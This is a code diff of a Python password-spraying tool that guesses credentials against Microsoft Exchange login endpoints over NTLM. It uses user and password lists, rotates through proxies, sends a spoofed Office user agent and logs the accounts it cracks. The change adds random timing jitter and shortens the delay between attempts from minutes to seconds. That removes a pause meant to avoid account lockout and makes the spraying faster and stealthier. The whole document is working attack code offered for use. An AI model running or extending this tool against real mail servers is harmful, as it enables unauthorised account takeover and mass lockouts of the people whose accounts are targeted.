@@ -8,9 +8,9 @@ import requests
 from requests_ntlm import HttpNtlmAuth
 import sys
 import time
+import random
 from urllib.parse import urlparse
 import base64
-import random
 import warnings
 
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
@@ -18,7 +18,6 @@ warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 ############################ Internal VARS ############################
 ARG_PARSER = None
 AUTH_URL = None
-DELAY = 1800
 MAX_THREADS = 1
 VERBOSE = False
 JOB_QUEUE = None
@@ -33,16 +32,7 @@ PROXY_LIST = None
 AUTH_TYPE = 'NTLM'
 USER_AGENT = 'Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)'
 
-
 ############################ AUTH URLs sample ############################
-
-# https://webmail.example.org/mapi/
-# https://webmail.example.org/EWS/Exchange.asmx
-# https://mail.example.org/autodiscover/autodiscover.xml
-# https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml
-# https://autodiscover-s.outlook.com/EWS/Exchange.asmx
-
-# python3 exchange_password_spray.py -U userlist.txt -P password.txt --url https://webmail.example.org/EWS/Exchange.asmx --delay 62 -T 1 -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" -O result.txt -v
 
 def generate_argparser():
     ascii_logo = """
@@ -66,7 +56,10 @@ def generate_argparser():
                     help="Use explicit Authentication URL. ex: https://mail.example.org/autodiscover/autodiscover.xml")
 
     ap.add_argument("--delay", action='store', type=int, default=30,
-                    help="Delay between authentication attempts in minutes, default is 30 minutes.")
+                    help="Base delay between authentication attempts in seconds, default is 30 seconds.")
+
+    ap.add_argument("--jitter", action='store', type=int, default=5,
+                    help="Max jitter in seconds to add random delay to each request, default is 5 seconds.")
 
     ap.add_argument("-T", "--threads", action='store', type=int, default=1,
                     help="Max number of concurrent threads, default is 1 thread.")
@@ -83,6 +76,10 @@ def generate_argparser():
     ap.add_argument("--version", action="version", version='MS Exchange Password Spray tool version 1.0  https://github.com/iomoath/PyExchangePasswordSpray')
     return ap
 
+def encode_to_base64(text):
+    message_bytes = text.encode('ascii')
+    base64_bytes = base64.b64encode(message_bytes)
+    return base64_bytes.decode('ascii')
 
 def read_proxy():
     global PROXY_LIST
@@ -98,7 +95,6 @@ def read_proxy():
     except:
         PROXY_LIST = []
 
-
 def get_random_proxy():
     global PROXY_LIST
 
@@ -107,7 +103,6 @@ def get_random_proxy():
 
     proxy = random.choice(PROXY_LIST)
     return {"http": proxy, "https": proxy}
-
 
 def init_job_queue(args):
     global JOB_QUEUE
@@ -118,12 +113,14 @@ def init_job_queue(args):
     with open(args["user_list"].strip()) as f:
         user_list = [line.rstrip('\n') for line in f]
 
-    password_list_path = args['password_list'].strip()
-    if password_list_path is not None and os.path.isfile(password_list_path):
-        with open(args["password_list"].strip()) as f:
-            password_list = [line.rstrip('\n') for line in f]
-    elif args['password_list'].strip() is not None:
-        password_list.append(args['password_list'].strip())
+    password_list_path = args.get('password_list')
+    if password_list_path:
+        password_list_path = password_list_path.strip()
+        if os.path.isfile(password_list_path):
+            with open(password_list_path) as f:
+                password_list = [line.rstrip('\n') for line in f]
+        else:
+            password_list.append(password_list_path)
 
     for i in range(MAX_THREADS):
         for password in password_list:
@@ -135,13 +132,6 @@ def init_job_queue(args):
     print(colored(
         '[*] Attempting {} password against {} user on {}'.format(len(password_list), len(user_list), base_domain),
         'yellow'))
-
-
-def encode_to_base64(text):
-    message_bytes = text.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    return base64_bytes.decode('ascii')
-
 
 def get_auth_type(proxy=None):
     global AUTH_URL
@@ -172,12 +162,10 @@ def get_auth_type(proxy=None):
     except Exception as e:
         print(colored('get_auth_type() {}'.format(e), 'red'))
 
-
 def init(args):
     global MAX_THREADS
     global LOGGING_ENABLED
     global CH
-    global DELAY
     global VERBOSE
     global USER_AGENT
     global AUTH_URL
@@ -188,20 +176,18 @@ def init(args):
         read_proxy()
 
         MAX_THREADS = args['threads']
-        DELAY = args['delay']
-
         VERBOSE = args['verbose']
 
-        if args['useragent'] is not None and len(args['useragent'].strip()) > 0:
+        if args.get('useragent'):
             USER_AGENT = args['useragent'].strip()
 
-        auth_domain = args['domain']
-        auth_url = args['url']
+        auth_domain = args.get('domain')
+        auth_url = args.get('url')
 
-        if auth_url is not None and len(auth_url) > 1:
+        if auth_url:
             AUTH_URL = auth_url.strip().rstrip('/')
 
-        elif auth_domain is not None and len(auth_domain) > 1:
+        elif auth_domain:
             if auth_domain.startswith('http://') or auth_domain.startswith('https://'):
                 AUTH_URL = '{}/mapi/'.format(auth_domain)
             else:
@@ -211,8 +197,9 @@ def init(args):
             ARG_PARSER.print_help()
             sys.exit(0)
 
-        output_path = args['output'].strip()
-        if output_path is not None:
+        output_path = args.get('output')
+        if output_path:
+            output_path = output_path.strip()
             CH = logging.FileHandler(output_path)
             CH.setFormatter(logging.Formatter('%(message)s'))
             LOGGER.addHandler(CH)
@@ -228,7 +215,6 @@ def init(args):
     init_job_queue(args)
     time.sleep(3)
 
-
 def log_success_login(username, password):
     global LOGGER
     global LOGGING_ENABLED
@@ -238,7 +224,6 @@ def log_success_login(username, password):
 
     msg = '{}:{}'.format(username, password)
     LOGGER.info(msg)
-
 
 def print_verbose(msg, color):
     global VERBOSE
@@ -250,7 +235,6 @@ def print_verbose(msg, color):
         print(msg)
     else:
         print(colored(msg, color))
-
 
 def process(username, password, proxy=None):
     global AUTH_URL
@@ -288,14 +272,10 @@ def process(username, password, proxy=None):
         msg = "[!] Failed: {}:{}".format(username, password)
         print_verbose(msg, 'yellow')
 
-
-def worker():
+def worker(args):
     global JOB_QUEUE
-    global DELAY
-    global TIMEOUT
     global VALID_ACCOUNTS
 
-    thread = threading.Thread()
     while not JOB_QUEUE.empty():
         try:
             job = JOB_QUEUE.get()
@@ -314,34 +294,27 @@ def worker():
                     continue
 
                 process(user, password, get_random_proxy())
+                jitter = random.uniform(0, args['jitter'])
+                time.sleep(args['delay'] + jitter)
 
             except Exception as e:
                 msg = "[-] ERROR: '{}:{}'. {}".format(user, password, e)
                 print_verbose(msg, "red")
-
-        if not JOB_QUEUE.empty():
-            print(
-                colored('[*] "{}" Pausing for {} minutes to avoid account lockout'.format(thread.name, DELAY), 'white'))
-            seconds = DELAY * 60
-            time.sleep(seconds)
-
 
 def run(args):
     global MAX_THREADS
 
     init(args)
 
-    # start worker threads
+    # Start worker threads
     for i in range(MAX_THREADS):
-        threading.Thread(target=worker).start()
-
+        threading.Thread(target=worker, args=(args,)).start()
 
 def main():
     global ARG_PARSER
     ARG_PARSER = generate_argparser()
     args = vars(ARG_PARSER.parse_args())
     run(args)
-
 
 if __name__ == "__main__":
     main()
